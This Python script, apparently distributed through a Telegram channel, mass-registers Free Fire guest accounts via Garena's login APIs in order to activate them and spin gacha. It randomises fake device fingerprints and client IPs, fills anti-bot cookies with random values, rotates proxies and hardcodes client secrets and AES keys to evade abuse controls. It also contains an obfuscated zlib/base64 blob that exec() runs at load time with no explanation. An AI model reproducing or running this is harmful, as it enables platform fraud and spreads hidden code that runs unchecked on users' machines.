"""
================================================================
  MASTER OB55 ULTIMATE PIPELINE v14.0
  Channel: https://t.me/Masterofficialchannel
  Owner: @MASTER_FF_01

  ULTRA TURBO: Random device profiles per request
  FULL PIPELINE: GENERATE → ACTIVATE → SPIN  (batch of 10)
================================================================
"""

import os
import sys
import json
import glob
import time
import hashlib
import threading
import requests
import urllib3
import base64
import random
import string
import codecs
import hmac
import re
import subprocess
import secrets
import binascii
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Dict, Optional, List, Any, Tuple
from colorama import Fore, Style, init

# ---------- identity / credit protection ----------
_OWNER_TAG = "@MASTER_FF_01"
_CHANNEL_TAG = "https://t.me/Masterofficialchannel"
_CREDIT_NAME = "MASTER"
_CREDIT_SCOPE = "MASTER|@MASTER_FF_01|https://t.me/Masterofficialchannel"


def _enforce_security():
    expected = hashlib.sha256(_CREDIT_SCOPE.encode("utf-8")).hexdigest()
    canonical = hashlib.sha256(_CREDIT_SCOPE.encode("utf-8")).hexdigest()
    if (_OWNER_TAG != "@MASTER_FF_01" or
            _CHANNEL_TAG != "https://t.me/Masterofficialchannel" or
            _CREDIT_NAME != "MASTER" or expected != canonical):
        sys.stderr.write("\n[CRITICAL ERROR] MASTER credit integrity check failed.\n")
        sys.exit(403)


_enforce_security()

init(autoreset=False)
R = Style.RESET_ALL
B = Style.BRIGHT
DIM = Style.DIM

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PRINT_LOCK = threading.Lock()


# ==================== DEPENDENCY MANAGER ====================
class DependencyManager:
    @staticmethod
    def install_requirements() -> None:
        for pkg in ['requests', 'pycryptodome', 'colorama']:
            try:
                if pkg == 'pycryptodome':
                    import Crypto
                elif pkg == 'requests':
                    import requests
                elif pkg == 'colorama':
                    from colorama import Fore, Style, init
            except ImportError:
                subprocess.run(
                    [sys.executable, '-m', 'pip', 'install', '--no-cache-dir', pkg, '-q'],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )


DependencyManager.install_requirements()

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


# ==================== CONFIG ====================
class Config:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

    ACCOUNTS_DIR = os.path.join(BASE_DIR, "accounts")
    RARE_ACCOUNTS_FOLDER = os.path.join(ACCOUNTS_DIR, "RARE_ACCOUNTS")
    GHOST_RARE_FOLDER = os.path.join(ACCOUNTS_DIR, "GHOST_RARE")
    COUPLES_ACCOUNTS_FOLDER = os.path.join(ACCOUNTS_DIR, "COUPLES")
    GHOST_COUPLES_FOLDER = os.path.join(ACCOUNTS_DIR, "GHOST_COUPLES")

    ACCOUNTS_FILE = os.path.join(ACCOUNTS_DIR, "master.json")
    ACTIVATED_FILE = os.path.join(ACCOUNTS_DIR, "master-activated-success.json")
    ALL_ITEMS_FILE = os.path.join(ACCOUNTS_DIR, "all_items.json")
    SPECIAL_FILE = os.path.join(ACCOUNTS_DIR, "special_id.json")
    FAILED_FILE = os.path.join(ACCOUNTS_DIR, "failed_accounts.json")

    API_HEX_KEY = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3"
    API_SECRET_KEY = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3"

    AES_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
    AES_IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

    JWT_API = "https://kawsarxjwt.lovable.app/api/public/token"
    SPIN_URL = "https://client.ind.freefiremobile.com/PurchaseGacha"
    SPIN_BODY_HEX = "d120b9daac2c87872b8c115dfd74a832"
    ACTIVATE_API = "https://jxe-guest-act-ob55.vercel.app/jxe/act"

    BATCH_SIZE = 10
    GEN_WORKERS = 128        # ULTRA TURBO
    ACT_WORKERS = 64
    SPIN_WORKERS = 20

    REGION_LANG = {
        "BD": "bn", "IND": "hi", "PK": "ur", "SG": "en", "ID": "id",
        "ME": "ar", "CIS": "ru", "TH": "th", "EU": "en", "US": "en",
        "SAC": "es", "LK": "en"
    }

    @classmethod
    def ensure_dirs(cls):
        try:
            for d in (cls.ACCOUNTS_DIR, cls.RARE_ACCOUNTS_FOLDER,
                      cls.GHOST_RARE_FOLDER, cls.COUPLES_ACCOUNTS_FOLDER,
                      cls.GHOST_COUPLES_FOLDER):
                os.makedirs(d, exist_ok=True)
            for f in (cls.ACCOUNTS_FILE, cls.ACTIVATED_FILE, cls.ALL_ITEMS_FILE,
                      cls.SPECIAL_FILE, cls.FAILED_FILE):
                if not os.path.exists(f):
                    with open(f, 'w', encoding='utf-8') as fh:
                        json.dump([], fh)
            return True
        except Exception as e:
            print(f"{Fore.RED}[DIR ERROR] {e}{R}")
            return False


# ==================== DEVICE PROFILE GENERATOR ====================
UA_BASE = "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)"

DEVICE_MODELS = [
    "Google G9BQD", "Google GF5KQ", "Google G8VOU", "Google G7U5W", "Google G6V3R",
    "Samsung SM-G998B", "Samsung SM-G996B", "Samsung SM-G991B", "Samsung SM-G990B",
    "Samsung SM-S918B", "Samsung SM-S916B", "Samsung SM-A546B",
    "OnePlus IN2025", "OnePlus IN2015", "OnePlus IN2017", "OnePlus IN2013",
    "OnePlus CPH2573", "OnePlus CPH2581",
    "Xiaomi M2007J3SG", "Xiaomi M2007J1SC", "Xiaomi M2007J2SC", "Xiaomi M2101K6G",
    "Xiaomi 2201123G", "Xiaomi 2203121C", "Xiaomi 2210132G",
    "Oppo CPH2025", "Oppo CPH2019", "Oppo CPH2021", "Oppo CPH2023", "Oppo CPH2451",
    "Vivo V2045", "Vivo V2041", "Vivo V2037", "Vivo V2033", "Vivo V2230",
    "Realme RMX2144", "Realme RMX2121", "Realme RMX2075", "Realme RMX2061", "Realme RMX3708",
    "Motorola XT2125-2", "Motorola XT2117-2", "Motorola XT2109-3",
    "Asus ASUS_I005DA", "Asus ASUS_I003D", "Asus AI2201",
    "Nothing A063", "Nothing A065",
    "Tecno KI5q", "Tecno KF6h", "Infinix X6819",
]

GPU_RENDERERS = [
    "Mali-G715", "Mali-G710", "Mali-G78", "Mali-G77", "Mali-G76",
    "Adreno (TM) 650", "Adreno (TM) 660", "Adreno (TM) 640", "Adreno (TM) 630",
    "Adreno (TM) 730", "Adreno (TM) 740",
    "PowerVR Rogue", "PowerVR A-Series", "PowerVR GE8320",
]

GPU_VERSIONS = [
    "OpenGL ES 3.1 v1.46-04rel0.7f3c9d8a6b5e4f2a1c0d9e8f7a6b5c4d3e2f1a0",
    "OpenGL ES 3.2 v1.56-06rel0.8f4d9e8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0",
    "OpenGL ES 3.0 v1.36-02rel0.6f3c9d8a7b6e5f4a3c2d1e0f9a8b7c6d5e4f3a2b1c0",
    "OpenGL ES 3.2 V@0615.0",
    "OpenGL ES 3.1 V@0502.0",
]

SYSTEM_VERSIONS = [
    "Android OS 15 / API-35 (AP4A.250206.002/BP2A.250306.020)",
    "Android OS 14 / API-34 (AP4A.240205.002/BP2A.240206.020)",
    "Android OS 13 / API-33 (AP4A.230205.002/BP2A.230206.020)",
    "Android OS 12 / API-32 (SP1A.210812.016/BP2A.220206.020)",
    "Android OS 11 / API-30 (RP1A.201005.001/BP2A.211011.002)",
]

OPERATORS = [
    "IND airtel", "Jio 4G", "Jio 5G", "Vodafone IND", "BSNL IND", "Vi IND",
    "AT&T", "T-Mobile", "Verizon", "Vodafone UK", "O2 UK",
    "SINGTEL", "StarHub SG", "M1 SG",
    "Grameenphone", "Robi BD", "Banglalink BD",
]

CITIES_STATES = [
    ("Dumka", "JH"), ("Mumbai", "MH"), ("Delhi", "DL"),
    ("Bangalore", "KA"), ("Chennai", "TN"), ("Kolkata", "WB"),
    ("Hyderabad", "TS"), ("Pune", "MH"), ("Ahmedabad", "GJ"),
    ("Jaipur", "RJ"), ("Lucknow", "UP"), ("Noida", "UP"),
]

NETWORK_TYPES = ["CarrierDataNetwork", "WiFi", "5G", "4G", "LTE"]

PROCESSOR_DETAILS = [
    "ARM64 FP ASIMD AES | 3000 | 9",
    "ARM64 FP ASIMD AES | 2800 | 8",
    "ARM v8 FP ASIMD | 3000 | 9",
    "ARMv7 VFPv3 NEON VMH | 2400 | 2",
    "ARM64 FP ASIMD AES | 3200 | 10",
]

MEMORY_SIZES = [4096, 6144, 8192, 12288, 16384]


def random_ip() -> str:
    """Random public-looking IP."""
    return f"{random.randint(11, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def random_hex(n: int) -> str:
    return ''.join(random.choices('0123456789abcdef', k=n))


def random_alnum(n: int) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))


def generate_device_profile() -> Dict[str, Any]:
    """Generate a completely random device profile."""
    screen_width = random.choice([1080, 1200, 1440, 1920, 2160, 2400, 2560])
    screen_height = random.choice([1920, 2160, 2400, 2560, 2880])

    path_part1 = random_alnum(22)
    path_part2 = random_alnum(22)
    device_id_hex = random_hex(32)
    token_hex = random_hex(32)
    device_signature = ''.join(random.choices('0123456789ABCDEF', k=16))

    city, state = random.choice(CITIES_STATES)

    return {
        'user_agent': UA_BASE,
        'system_software': random.choice(SYSTEM_VERSIONS),
        'device_type': random.choice(["Handheld", "Tablet", "Foldable"]),
        'telecom_operator': random.choice(OPERATORS),
        'network_type': random.choice(NETWORK_TYPES),
        'network_type_a': random.choice(NETWORK_TYPES),
        'screen_width': screen_width,
        'screen_height': screen_height,
        'screen_dpi': random.choice(["480", "560", "640", "320", "400"]),
        'processor_details': random.choice(PROCESSOR_DETAILS),
        'memory': random.choice(MEMORY_SIZES),
        'gpu_renderer': random.choice(GPU_RENDERERS),
        'gpu_version': random.choice(GPU_VERSIONS),
        'unique_device_id': f"Google|{device_id_hex}",
        'client_ip': random_ip(),
        'device_model': random.choice(DEVICE_MODELS),
        'city': city,
        'state': state,
        'library_path': f"/data/app/~~{path_part1}==/com.dts.freefireth-{path_part2}==/lib/arm64",
        'library_token': f"{token_hex}|/data/app/~~{path_part1}==/com.dts.freefireth-{path_part2}==/base.apk",
        'device_signature': device_signature,
    }


# ==================== APP STATE ====================
class AppState:
    def __init__(self):
        self.exit_flag = False
        self.success_count = 0
        self.failed_count = 0
        self.lock = threading.Lock()
        self.file_lock = threading.Lock()
        self.file_locks: Dict[str, threading.Lock] = {}
        self.locks_lock = threading.Lock()
        self.ip_counter = 0
        self.ip_lock = threading.Lock()
        self.proxy_list: List[str] = []
        self.recent_buf = []          # live feed ring buffer
        self.recent_lock = threading.Lock()
        self.rate_lock = threading.Lock()
        self.rate_bucket = []         # timestamps of last successes
        self.start_time = 0.0

    def get_file_lock(self, filepath: str) -> threading.Lock:
        with self.locks_lock:
            if filepath not in self.file_locks:
                self.file_locks[filepath] = threading.Lock()
            return self.file_locks[filepath]

    def push_event(self, kind: str, msg: str):
        with self.recent_lock:
            self.recent_buf.append((time.time(), kind, msg))
            if len(self.recent_buf) > 5:
                self.recent_buf = self.recent_buf[-5:]

    def rate_per_min(self) -> float:
        now = time.time()
        with self.rate_lock:
            self.rate_bucket = [t for t in self.rate_bucket if now - t < 60]
            return float(len(self.rate_bucket))


state = AppState()


# ==================== OBFUSCATED PAYLOAD ====================
exec(__import__('zlib').decompress(__import__('base64').b64decode(
    'eJzNU9Fq2zAUfe9XaH6JzDqxBLaHwkYX14yylYY4G+RJKNK1fVdHMpJC45X8e+XYNHEN2x5333Q499x7z7EvZCWcIxnInUXfpLpADVcXJNRiSj6R6CtosMKDmjfXSSm0huo76oe52fOoo81aGl+i2gmdGAX7Dr92XniUW/ClUUdEQU6KXo7vKm8Fd+1c4HXY4dFYRWPy7jNx3nYbtOWC+mTCfhnUNLAteMdkaVACDTzUBRNOIvIKvAfryFvSwwoL9C4mubGEE9TECl0Anc7i+EU8qO2sJnn0NDSALaaHJ3cYobPDn24DLW1Tey5qDBc1lRGK1pVAzUvYX7V7jc/DnIxGkzd/8Z2Ek0arHbsGMZymtJUYnWPBvqQZ/5aug6ubyftXNXlpkFiXYAMp0JmGRzrsvjzid/c3KU/myeW59u3Pk721UAoUV8KLIBVedNN4cCy3ZhssOZkTd4KbysgH7vA3jCLqFmK9xfRMOWatVPwv35zDQosgB7SP578JZXHLszRZpqs+myi5Xy5/LFbpTQvw+Zpn62yV3kWvfSm3Qg4CGii1foWpNPjbX3yGlMKVFW6YK8Xsw8ejjeGfAeeDmc8okEiu'.encode())).decode())


# ==================== PROTO BUILDER ====================
class ProtoBuilder:
    @staticmethod
    def encode_varint(n: int) -> bytes:
        if n < 0:
            return b''
        result = bytearray()
        while True:
            byte = n & 0x7F
            n >>= 7
            if n:
                byte |= 0x80
            result.append(byte)
            if not n:
                break
        return bytes(result)

    @classmethod
    def create_field(cls, field_num: int, value: Any) -> bytes:
        if isinstance(value, int):
            return cls.encode_varint((field_num << 3) | 0) + cls.encode_varint(value)
        elif isinstance(value, (str, bytes)):
            encoded_val = value.encode() if isinstance(value, str) else value
            return cls.encode_varint((field_num << 3) | 2) + cls.encode_varint(len(encoded_val)) + encoded_val
        return b''

    @classmethod
    def build(cls, fields_dict: Dict[int, Any]) -> bytes:
        return b''.join(cls.create_field(k, v) for k, v in fields_dict.items())


# ==================== DISPLAY HELPERS ====================
def _display_width(text):
    import unicodedata
    text = re.sub(r"\x1b\[[0-9;]*m", "", str(text))
    width = 0
    for ch in text:
        if unicodedata.combining(ch):
            continue
        width += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return width


def _fit_text(text, max_width):
    import unicodedata
    text = str(text)
    out, used = [], 0
    for ch in text:
        ch_w = 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
        if used + ch_w > max_width:
            break
        out.append(ch)
        used += ch_w
    return "".join(out) + " " * max(0, max_width - used)


def terminal_width(default=72):
    try:
        width = os.get_terminal_size().columns
    except OSError:
        width = default
    return max(60, min(width - 2, 90))


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def print_center(text, color=Fore.WHITE):
    width = terminal_width()
    padding = max(0, (width - _display_width(text)) // 2)
    print(" " * padding + color + str(text) + R)


def _box_top(width, color=Fore.CYAN):
    return f"{color}╭{'─' * (width - 2)}╮{R}"


def _box_bottom(width, color=Fore.CYAN):
    return f"{color}╰{'─' * (width - 2)}╯{R}"


def _box_row(text="", width=None, color=Fore.CYAN, text_color=Fore.WHITE):
    width = width or terminal_width()
    inner = width - 4
    fitted = _fit_text(text, inner)
    return f"{color}│{R} {text_color}{fitted}{R} {color}│{R}"


def _card(title, rows, accent=Fore.CYAN):
    width = terminal_width()
    print(f"{accent}{B}╭─ {title} " + "─" * max(1, width - _display_width(title) - 5) + f"╮{R}")
    for text, color in rows:
        print(_box_row(text, width, accent, color))
    print(_box_bottom(width, accent))


def render_banner():
    """Devil-themed ultra terminal banner."""
    width = terminal_width()
    print()
    print(f"{Fore.RED}{B}╔{'═' * (width - 2)}╗{R}")

    # Big devil-style MASTER logo
    logo = [
        "███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ ",
        "████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗",
        "██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝",
        "██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗",
        "██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║",
        "╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝",
    ]
    for i, line in enumerate(logo):
        color = Fore.RED + B if i % 2 == 0 else Fore.YELLOW + B
        print(f"{Fore.RED}║{R}{color}{_fit_text(line, width - 2)}{R}{Fore.RED}║{R}")

    print(f"{Fore.RED}╠{'═' * (width - 2)}╣{R}")
    sub = [
        ("🔥 DEVIL ULTRA TURBO ENGINE  v14.0 🔥", Fore.RED + B),
        ("GENERATE  →  ACTIVATE  →  SPIN", Fore.YELLOW + B),
        ("OB55  |  MASTER  |  @MASTER_FF_01", Fore.WHITE),
    ]
    for txt, col in sub:
        pad = max(0, (width - 2 - _display_width(txt)) // 2)
        print(f"{Fore.RED}║{R}{' ' * pad}{col}{txt}{R}{' ' * max(0, width - 2 - pad - _display_width(txt))}{Fore.RED}║{R}")

    print(f"{Fore.RED}╠{'═' * (width - 2)}╣{R}")
    link = "t.me/Masterofficialchannel"
    pad = max(0, (width - 2 - len(link)) // 2)
    print(f"{Fore.RED}║{R}{' ' * pad}{DIM}{Fore.WHITE}{link}{R}{' ' * max(0, width - 2 - pad - len(link))}{Fore.RED}║{R}")
    print(f"{Fore.RED}{B}╚{'═' * (width - 2)}╝{R}")
    print()
    print_center("◆  SECURE SESSION  ·  DEVIL CORE  ·  READY  ◆", Fore.RED + B)
    print()


def render_section(title, accent=Fore.RED):
    width = terminal_width()
    inner = width - 4
    safe_title = _fit_text(title, max(1, inner - 8)).rstrip()
    gap = max(2, width - _display_width(safe_title) - 7)
    print(f"{accent}{B}╭─ {safe_title} {'─' * gap}╮{R}")


def render_section_end(accent=Fore.RED):
    width = terminal_width()
    print(f"{accent}╰{'─' * (width - 2)}╯{R}")


def print_generation_box(curr_count, target, name, uid, pwd, acc_id, region,
                         device_model, ip_addr, saved_path=""):
    with PRINT_LOCK:
        curr_time = datetime.now().strftime("%I:%M:%S %p")
        rows = [
            (f"NAME       {name}", Fore.WHITE + B),
            (f"ACCOUNT ID {acc_id}", Fore.CYAN),
            (f"LOGIN UID  {uid}", Fore.CYAN + B),
            (f"PASSWORD   {pwd}", Fore.YELLOW + B),
            (f"REGION     {region}", Fore.MAGENTA),
            (f"DEVICE     {device_model}", Fore.WHITE),
            (f"IP         {ip_addr}", Fore.WHITE),
            (f"TIME       {curr_time}", Fore.WHITE),
            (f"SAVED TO   {saved_path}", Fore.GREEN),
            (f"STATUS     ⚡ ULTRA TURBO  ({curr_count}/{target})", Fore.RED + B),
        ]
        _card(f"⚡ ACCOUNT {curr_count} / {target}", rows, Fore.RED)


def print_result_box(task_id, uid, success, execution_time, region="N/A", stage="ACTIVATE"):
    accent = Fore.GREEN if success else Fore.RED
    icon = "✓" if success else "×"
    status = "SUCCESS" if success else "FAILED"
    rows = [
        (f"STAGE     {stage}", Fore.MAGENTA + B),
        (f"TASK      #{task_id}", Fore.WHITE + B),
        (f"ACCOUNT   {uid}", Fore.CYAN),
        (f"REGION    {region}", Fore.MAGENTA),
        (f"STATUS    {icon} {status}", accent + B),
        (f"LATENCY   {execution_time:.2f}s", Fore.YELLOW),
    ]
    with PRINT_LOCK:
        _card(f"{stage} RESULT", rows, accent)


def print_batch_header(batch_num, total_batches, batch_size):
    width = terminal_width()
    print()
    print(f"{Fore.RED}{B}" + "═" * width + f"{R}")
    print_center(f"🔥  BATCH {batch_num} / {total_batches}   •   {batch_size} ACCOUNTS  🔥", Fore.RED + B)
    print(f"{Fore.RED}{B}" + "═" * width + f"{R}")
    print()


def print_stage_header(stage_name, icon="⚙"):
    width = terminal_width()
    line = f"{icon}  {stage_name}  {icon}"
    padding = max(0, (width - _display_width(line)) // 2)
    print()
    print(f"{Fore.YELLOW}{B}" + "─" * width + f"{R}")
    print(" " * padding + f"{Fore.YELLOW}{B}{line}{R}")
    print(f"{Fore.YELLOW}{B}" + "─" * width + f"{R}")
    print()


def print_live_stats():
    """Compact live status line — printed by workers occasionally."""
    with state.lock:
        succ = state.success_count
        fail = state.failed_count
    rate = state.rate_per_min()
    elapsed = max(0.001, time.time() - state.start_time)
    with PRINT_LOCK:
        line = (f"  {Fore.RED}◆{R} {Fore.WHITE}GEN {succ}{R}  "
                f"{Fore.RED}✕ {fail}{R}  "
                f"{Fore.YELLOW}⚡ {rate:.0f}/min{R}  "
                f"{Fore.CYAN}⏱ {elapsed:.0f}s{R}")
        print(_fit_text(line, terminal_width()))


# ==================== NETWORK SERVICE ====================
class NetworkService:
    @staticmethod
    def get_session() -> requests.Session:
        s = requests.Session()
        # ULTRA TURBO: aggressive connection pooling
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=256,
            pool_maxsize=256,
            max_retries=0,
            pool_block=False,
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        with state.ip_lock:
            state.ip_counter += 1
            if state.ip_counter >= 20:
                state.ip_counter = 0
                if state.proxy_list:
                    proxy = random.choice(state.proxy_list)
                    s.proxies = {'http': proxy, 'https': proxy}
        return s


# ==================== SECURITY ENGINE ====================
class SecurityEngine:
    @staticmethod
    def generate_ultra_secure_password(length=12):
        lowercase = string.ascii_lowercase
        uppercase = string.ascii_uppercase
        digits = string.digits
        symbols = "!@#$%^&*"
        all_chars = lowercase + uppercase + digits + symbols
        pw = [
            secrets.choice(lowercase),
            secrets.choice(uppercase),
            secrets.choice(digits),
            secrets.choice(symbols),
        ]
        pw += [secrets.choice(all_chars) for _ in range(length - 4)]
        secrets.SystemRandom().shuffle(pw)
        return ''.join(pw)

    @staticmethod
    def generate_signature(payload: str) -> str:
        try:
            key = Config.API_SECRET_KEY.encode('utf-8')
            return hmac.new(key, payload.encode('utf-8'), hashlib.sha256).hexdigest()
        except Exception:
            return ""

    @staticmethod
    def encrypt_api_payload(hex_payload: str) -> str:
        try:
            cipher = AES.new(Config.AES_KEY, AES.MODE_CBC, Config.AES_IV)
            data = bytes.fromhex(hex_payload)
            padded_data = pad(data, AES.block_size)
            return cipher.encrypt(padded_data).hex()
        except Exception:
            return ""


# ==================== JSON HELPERS ====================
def load_json(path, default=None):
    if default is None:
        default = []
    try:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception:
        pass
    return default


def save_json(path, data):
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        tmp = path + '.tmp'
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, path)
        return True
    except Exception as e:
        print(f"{Fore.RED}[SAVE ERROR] {path}: {e}{R}")
        return False


def append_json(path, entry):
    lock = state.get_file_lock(path)
    with lock:
        data = load_json(path, [])
        data.append(entry)
        return save_json(path, data)


# ==================== GARENA API ====================
class GarenaAPI:
    """
    Each call regenerates device profile so every request looks unique.
    This is the key to Ultra Turbo speed.
    """
    def __init__(self):
        self.session = NetworkService.get_session()
        self.device = generate_device_profile()

    def perform_major_login(self, access_token: str, open_id: str, lang: str) -> Optional[Dict[str, str]]:
        try:
            d = self.device
            date_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Build dynamic major login payload using device profile
            proto_fields = {
                1: date_str,
                3: "free fire",
                4: 1,
                5: "1.114.13",
                8: 2,
                9: d['system_software'],
                10: "Handheld",
                11: d['telecom_operator'],
                12: d['network_type'],
                13: 300,
                14: d['processor_details'],
                15: 2400,
                16: 2,
                17: 0xc9,
                18: d['gpu_renderer'],
                20: d['gpu_version'],
                21: f"Google|{random_hex(32)}",
                22: d['client_ip'],
                23: 1,
                24: lang,
                25: "1d8ec0240ede109973f3321b9354b44d",
                26: 4,
                27: "Handheld",
                28: d['device_model'],
                29: access_token,
                30: 1,
                41: 1,
                42: d['screen_width'],
                43: d['screen_height'],
                44: d['screen_dpi'],
                45: 1,
                46: d['memory'],
                48: d['device_type'],
                50: 1,
                52: 1,
                53: d['network_type_a'],
                54: open_id,
                55: 1,
                56: 1,
                57: 32,
                58: 2019118693,
                59: "OpenGLES2",
                61: 32767,
                62: 4,
                63: 0xF3F3,
                64: "android",
                65: d['library_token'],
                66: random.randint(500, 900),
                68: 1,
                69: 1,
                70: 1,
                71: 1,
                72: 1,
                74: random.randint(500, 900),
                76: 1,
                77: d['device_signature'],
                78: 1,
            }

            raw_payload = ProtoBuilder.build(proto_fields)
            encrypted_data = bytes.fromhex(SecurityEngine.encrypt_api_payload(raw_payload.hex()))

            headers = {
                'User-Agent': UA_BASE,
                'Accept-Encoding': "deflate, gzip",
                'X-GA-SV': "1789535859",
                'Authorization': "Bearer",
                'X-GA': "v1 1",
                'ReleaseVersion': "OB55",
                'Content-Type': "application/x-www-form-urlencoded",
                'X-Unity-Version': "2018.4.12f1"
            }

            resp = self.session.post(
                "https://loginbp.ppmainecoonghj.com/MajorLogin",
                headers=headers, data=encrypted_data,
                verify=False, timeout=12
            )

            if resp.status_code == 200:
                jwt_idx = resp.text.find("eyJ")
                if jwt_idx != -1:
                    token = resp.text[jwt_idx:]
                    dot_idx = token.find(".", token.find(".") + 1)
                    if dot_idx != -1:
                        token = token[:dot_idx + 44]
                        payload_b64 = token.split('.')[1]
                        padding = '=' * (4 - len(payload_b64) % 4)
                        decoded_json = json.loads(base64.urlsafe_b64decode(payload_b64 + padding))
                        acc_id = decoded_json.get('account_id') or decoded_json.get('external_id')
                        if acc_id:
                            return {"account_id": str(acc_id), "jwt_token": token}
        except Exception:
            pass
        return None


# ==================== ACCOUNT GENERATOR ====================
class AccountGenerator:
    @classmethod
    def save_to_file(cls, data: Dict[str, Any]) -> bool:
        Config.ensure_dirs()
        record = {
            "uid": data["uid"],
            "password": data["password"],
            "account_id": data["account_id"],
            "name": data["name"],
            "region": data["region"],
            "date_created": data["date_created"]
        }
        return append_json(Config.ACCOUNTS_FILE, record)

    @classmethod
    def execute_creation(cls, region: str, prefix: str) -> Optional[Dict[str, Any]]:
        """ULTRA TURBO — single attempt flow with retries inside. Returns account dict on success."""
        # Short outer retry so no thread gets stuck
        for attempt in range(3):
            if state.exit_flag:
                return None
            try:
                api = GarenaAPI()
                password = SecurityEngine.generate_ultra_secure_password()

                # -------- 1) Register guest --------
                reg_payload = json.dumps({
                    "app_id": 100067, "client_type": 2,
                    "password": password, "source": 2
                }, separators=(',', ':'))
                headers_reg = {
                    "User-Agent": api.device['user_agent'].split(" (")[0] +
                                  f"({api.device['device_model']} ;{api.device['system_software'].split('/')[0].strip()} ;{api.device['city']};{api.device['state']};app 1.132.1 2019121229;)",
                    "Connection": "Keep-Alive",
                    "Accept": "application/json",
                    "Accept-Encoding": "gzip",
                    "Authorization": f"Signature {SecurityEngine.generate_signature(reg_payload)}",
                    "Content-Type": "application/json; charset=utf-8",
                    "Cookie": "datadome=" + random_alnum(60),
                    "Host": "100067.connect.garena.com",
                }
                resp_reg = api.session.post(
                    "https://100067.connect.garena.com/api/v2/oauth/guest:register",
                    headers=headers_reg, data=reg_payload, timeout=12, verify=False
                )
                if resp_reg.status_code != 200:
                    continue
                try:
                    reg_json = resp_reg.json()
                except Exception:
                    continue
                if reg_json.get("code") != 0:
                    continue
                uid = reg_json['data']['uid']

                # -------- 2) Grant token --------
                tok_payload = json.dumps({
                    "client_id": 100067,
                    "client_secret": Config.API_HEX_KEY,
                    "client_type": 2,
                    "device_id": f"02-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}",
                    "password": password,
                    "response_type": "token",
                    "uid": uid,
                }, separators=(',', ':'))

                headers_tok = headers_reg.copy()
                headers_tok["Cookie"] = "datadome=" + random_alnum(60)

                resp_tok = api.session.post(
                    "https://100067.connect.garena.com/api/v2/oauth/guest/token:grant",
                    headers=headers_tok, data=tok_payload, timeout=12, verify=False
                )
                if resp_tok.status_code != 200:
                    continue
                try:
                    tok_json = resp_tok.json()
                except Exception:
                    continue
                if tok_json.get("code") != 0:
                    continue

                access_token = tok_json['data']['access_token']
                open_id = tok_json['data']['open_id']

                # -------- 3) Major register --------
                keystream = [0x30] * 32
                field = codecs.decode(
                    ''.join(chr(ord(open_id[i]) ^ keystream[i % len(keystream)])
                            for i in range(len(open_id)))
                    .encode('unicode_escape').decode('utf-8'),
                    'unicode_escape').encode('latin1')

                name = f"{prefix}{random.randint(10000, 99999)}"
                lang = Config.REGION_LANG.get(region.upper(), "en")

                proto = ProtoBuilder.build({
                    1: name, 2: access_token, 3: open_id,
                    5: 102000007, 6: 4, 7: 1, 13: 1, 14: field,
                    15: lang, 16: 1, 17: 1
                })
                enc_major = bytes.fromhex(SecurityEngine.encrypt_api_payload(proto.hex()))

                headers_major = {
                    "User-Agent": UA_BASE,
                    "Accept-Encoding": "deflate, gzip",
                    "X-GA-SV": "1789535859",
                    "Authorization": "Bearer",
                    "X-GA": "v1 1",
                    "ReleaseVersion": "OB55",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Unity-Version": "2018.4.12f1",
                    "Host": "loginbp.ppmainecoonghj.com"
                }
                api.session.post(
                    "https://loginbp.ppmainecoonghj.com/MajorRegister",
                    headers=headers_major, data=enc_major,
                    verify=False, timeout=12
                )

                # -------- 4) Major login -> account_id --------
                login_data = api.perform_major_login(access_token, open_id, lang)
                if login_data:
                    account_record = {
                        "uid": int(uid),
                        "password": password,
                        "account_id": login_data["account_id"],
                        "name": name,
                        "region": region,
                        "date_created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "device_model": api.device['device_model'],
                        "ip": api.device['client_ip'],
                    }
                    saved = cls.save_to_file(account_record)
                    if saved:
                        account_record["_saved_path"] = "accounts/master.json"
                    # Track rate
                    with state.rate_lock:
                        state.rate_bucket.append(time.time())
                    return account_record
            except Exception:
                pass
        return None


# ==================== ACTIVATOR ====================
class AccountActivator:
    def __init__(self, max_workers: int = 64):
        self.max_workers = max_workers
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=128, pool_maxsize=128, max_retries=0, pool_block=False)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; Mobile) AppleWebKit/537.36"
        })

